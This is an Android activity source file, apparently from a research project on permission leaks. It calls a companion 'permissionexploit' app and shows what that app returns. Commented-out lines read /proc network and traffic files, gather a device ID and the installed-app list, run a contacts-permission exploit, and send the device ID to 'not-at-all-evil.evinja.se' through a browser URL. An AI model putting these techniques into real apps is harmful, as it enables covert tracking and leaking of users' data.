package se.evinja.lbs.lbsapp;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    private int REQUEST_CODE = 600;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

//        LinuxKernel lk = new LinuxKernel();
//        lk.runCommand("cat /proc/net/arp");
//        lk.runCommand("cat /proc/net/wireless");
//        lk.runCommand("cat -l /proc/uid_stat/10055/tcp_rcv");

//        String uid = new UniqueID().getID(getApplicationContext());
//        Log.i("GOT ID", uid);
//
//        new InstalledApps().getInstalledApps(getApplicationContext());
//
        Intent i =  new Intent(Intent.ACTION_SEND);
        i.setComponent(new ComponentName("se.evinja.lbs.permissionexploit", "se.evinja.lbs.permissionexploit.MainActivity"));
        try {
//            startActivity(i);
            startActivityForResult(i, REQUEST_CODE);
        } catch (SecurityException e) {
            TextView tv = (TextView) findViewById(R.id.textString);
            if (tv != null) {
                tv.setText(e.getMessage());
            }
        }

//        new ExploitContactsPermission().startExploit(getApplicationContext());

        // Start web-browser
//        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("http://not-at-all-evil.evinja.se?id=" + uid));
//        startActivity(intent);

    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode,
                                    Intent data) {
        if (requestCode == REQUEST_CODE) {
            if (resultCode == RESULT_OK) {
                String string = data.getStringExtra("RESULT_STRING");
//                Toast.makeText(this, string, Toast.LENGTH_SHORT).show();
                TextView tv = (TextView)findViewById(R.id.textString);
                if (string != null && tv != null) {
                    tv.setText(string);
                }
            }
        }
    }
}
